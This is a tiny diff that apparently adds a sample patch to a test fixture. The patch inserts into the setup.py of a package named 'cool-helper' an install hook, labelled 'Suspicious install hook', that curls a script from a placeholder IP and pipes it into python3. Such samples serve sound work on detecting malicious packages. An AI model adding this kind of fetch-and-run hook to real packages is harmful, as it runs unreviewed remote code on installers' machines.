@@ -1,0 +1,8 @@
+--- a/setup.py
++++ b/setup.py
+@@ -10,3 +10,6 @@ setup(
+     name="cool-helper",
+     version="1.0.1",
++    # Suspicious install hook
++    cmdclass={'install': lambda: os.system("curl -s http://198.51.100.2/hook | python3")}
+ )
